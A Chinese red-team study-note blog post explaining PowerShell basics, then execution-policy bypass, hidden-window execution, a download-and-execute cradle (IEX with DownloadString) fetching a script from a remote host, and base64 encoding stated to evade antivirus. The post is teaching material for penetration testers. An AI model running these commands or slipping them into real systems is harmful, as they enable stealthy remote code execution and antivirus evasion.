---
title: 【内网学习笔记】2、PowerShell
date: 2021-02-06 19:18:59
id: 210206-191859
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-06_18-40-25.png
tags:
- 红队
- 学习笔记
- 内网
categories:
- 内网学习笔记
---

## 1、介绍

PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 PowerShell 还能做很多 cmd 不能做的事情。

PowerShell 内置在 Windows 7、Windows Server 2008 R2 及更高版本的 Windows 系统中，同时 PowerShell 是构建在 .NET 平台上的，所有命令传递的都是 .NET 对象。

PowerShell 有如下特点：

* Windows 7 以上的操作系统默认安装
* PowerShell 脚本可以运行在内存中，不需要写入磁盘
* 可以从另一个系统中下载 PowerShell 脚本并执行
* 目前很多工具都是基于 PowerShell 开发的
* 很多安全软件检测不到 PowerShell 的活动
* cmd 通常会被阻止运行，但是 PowerShell 不会
* 可以用来管理活动目录

可输入 Get-Host 或者 $PSVersionTable 查看 PowerShell 版本：

```
PS C:\Users\teamssix> Get-Host

Name             : ConsoleHost
Version          : 5.1.18362.1171
InstanceId       : a0a6f8f2-f86a-477f-bf4b-b94b452bee3c
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : zh-CN
CurrentUICulture : zh-CN
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace
```

```
PS C:\Users\teamssix> $PSVersionTable

Name                           Value
----                           -----
PSVersion                      5.1.18362.1171
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.18362.1171
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1
```

Windows 操作系统对应的 PowerShell 版本信息：

1.0        windows server 2008

2.0        windows server 2008 r2、windows 7

3.0        windows server 2012、windows 8

4.0        windows server 2012 r2、windows 8.1

5.0        windows 10

5.1        windows server 2016

## 2、基本概念

### ps1 文件

ps1 是PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件。

### 执行策略

为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式`Restricted`。

使用 `Get-ExecutionPolicy`命令查看当前执行策略

```
PS C:\Users\teamssix> Get-ExecutionPolicy
Restricted
```

执行策略有以下几种：

**Restricted**：不能运行脚本

**RemoteSigned**：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）

**AllSigned**：仅当脚本由受信任的发布者签名才能运行。 

**Unrestricted**：脚本执行不受限制，不管来自哪里，也不管它们是否有签名。

使用`Set-ExecutionPolicy <policy name>`设置执行策略，该命令需要管理员权限

```
PS C:\WINDOWS\system32> Set-ExecutionPolicy Unrestricted

执行策略更改
执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?
[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): A

PS C:\WINDOWS\system32> Get-ExecutionPolicy
Unrestricted
```

### 运行脚本

PowerShell 运行脚本的方式和其他 shell 基本一致，可以输入完整路径运行，也可以到 ps1 文件所在目录下去运行，具体如下：

 ```
PS C:\Users\teamssix> C:\t.ps1
hello TeamsSix

PS C:\Users\teamssix> cd C:\

PS C:\> .\t.ps1
hello TeamsSix
 ```

> 这里不禁想吐槽一下，在看百度百科的时候关于 PowerShell 运行脚本的描述是这样的：“假设你要运行一个名为a.ps1的脚本，你可以键入 C:\Scripts\aps1，最大的例外是，如果 PowerShell 脚本文件刚好位于你的系统目录中，那么你可以直接在命令提示符命令提示符后键入脚本文件名即可运行”
>
> 这里的“系统目录”是指的啥目录？C:\还是C:\windows\system目录，“最大的例外”又是什么鬼，讲道理读起来有一种机翻的感觉。

### 管道

PowerShell 中的管道类似于 linux 中的管道，都是将前一个命令的输出作为另一个命令的输入，两个命令之间使用 “|” 进行连接。

例如，在 PowerShell 中获取进程信息并以程序 ID 进行排序

```
PS C:\> Get-Process | Sort-Object ID

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
      0       0       60          8                 0   0 Idle
   3038       0      208       4760                 4   0 System
      0      12     7732      81344                88   0 Registry
     53       3     1160        752               368   0 smss
    256      10     2468       7424               424   0 svchost
    662      21     1788       4668               504   0 csrss
    160      11     1364       5660               580   0 wininit
    653      27    18592     177580               588   1 csrss
   1219      67    59660         52       2.59    600   1 WinStore.App
    278      14     3108      15656               684   1 winlogon
    687      11     5420       9432               724   0 services
```

## 3、一些命令

> -NoLogo：启动不显示版权标志的PowerShell
>
> -WindowStyle Hidden (-W Hidden)：隐藏窗口
>
> -NoProfile (-NoP)：不加载当前用户的配置文件
>
> –Enc：执行 base64 编码后的 powershell 脚本字符串
>
> -ExecutionPolicy Bypass (-Exec Bypass) ：绕过执行安全策略
>
> -Noexit：执行后不退出Shell，这在使用键盘记录等脚本时非常重要
>
> -NonInteractive (-Nonl)：非交互模式，PowerShell 不为用户提供交互的提示

在 PowerShell 下，命令的命名规范很一致，都采用了动词-名词的形式，如 Net-Item，动词一般为 Add、New、Get、Remove、Set 等。PowerShell 还兼容 cmd 和 Linux 命令，如查看目录可以使用 dir 或者 ls 。

### 文件操作类命令

```
新建目录test：New-Item test -ItemType directory
删除目录test：Remove-Item test
新建文件test.txt：New-Item test.txt -ItemType file
新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value "hello"
删除文件test.txt：Remove-Item test.txt
查看文件test.txt内容：Get-Content  test.txt
设置文件test.txt内容t：Set-Content  test.txt  -Value "hello"
给文件test.txt追加内容：Add-Content test.txt  -Value ",word!"
清除文件test.txt内容：Clear-Content test.txt
```

### 绕过本地权限并执行

上面说到了默认情况下 PowerShell 的执行策略是受限模式`Restricted`，这就导致了在渗透测试过程中我们需要采用一些方法绕过这个策略，从而执行我们的脚本文件。

先来看看默认受限模式下执行脚本的情况

```
PS C:\Users\teamssix> powerShell.exe Get-ExecutionPolicy
Restricted

PS C:\Users\teamssix> PowerShell.exe -File t.ps1
无法加载文件 C:\Users\teamssix\t.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/?
LinkID=135170 中的 about_Execution_Policies。
    + CategoryInfo          : SecurityError: (:) []，ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnauthorizedAccess
```

这里系统会提示在此系统上禁止运行脚本，但加上 `-ExecutionPolicy Bypass`即可绕过这个限制

```
PS C:\Users\teamssix> cat .\t.ps1
echo "Hello TeamsSix"

PS C:\Users\teamssix> PowerShell.exe -ExecutionPolicy Bypass -File t.ps1
hello TeamsSix
```

### 绕过本地权限并隐藏执行

加入`-WindowStyle Hidden -NoLogo -NonInteractive -NoProfile` 即可隐藏执行。

```
PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File t.ps1
```

### 下载远程脚本绕过权限并隐藏执行

```
PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile "IEX(New-Object Net.WebClient).DownloadString('http://172.16.214.1:8000/t.ps1')"
```

或者简写

```
PowerShell.exe -Exec Bypass -W Hidden -NoLogo -NonI -NoP "IEX(New-Object Net.WebClient).DownloadString('http://172.16.214.1:8000/t.ps1')"
```

### 利用 Base64 对命令进行编码

使用 Base64 进行编码主要是为了混淆代码以避免被杀毒软件查杀，经过尝试这里直接使用 Base64 编码是不行的，可以使用 Github 上的一个编码工具，工具下载地址：

[https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py](https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py)

下载好后，需要先将要执行的命令保存到文本文件中，这里保存到了 tmp.txt 文本中，之后执行 `python ps_encoder.py -s tmp.txt` 即可

```
>cat tmp.txt
IEX(New-Object Net.WebClient).DownloadString('http://172.16.214.1:8000/t.ps1')

>python ps_encoder.py -s tmp.txt
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA
```

使用 –Enc 指定 Base64 编码内容

```
PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-06_18-40-25.png)

> 参考链接：
>
> [https://www.jianshu.com/p/c8f5c374466a](https://www.jianshu.com/p/c8f5c374466a)
>
> [https://www.cnblogs.com/frendguo/p/11761693.html](https://www.cnblogs.com/frendguo/p/11761693.html)
>
> [https://www.cnblogs.com/lavender000/p/6931405.html](https://www.cnblogs.com/lavender000/p/6931405.html)
>
> [https://www.cnblogs.com/coderge/articles/13768824.html](https://www.cnblogs.com/coderge/articles/13768824.html)
>
> [https://baike.baidu.com/item/Windows%20Power%20Shell](https://baike.baidu.com/item/Windows%20Power%20Shell)
>
> [https://blog.csdn.net/weixin_45116657/article/details/103449931](https://blog.csdn.net/weixin_45116657/article/details/103449931)
>
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)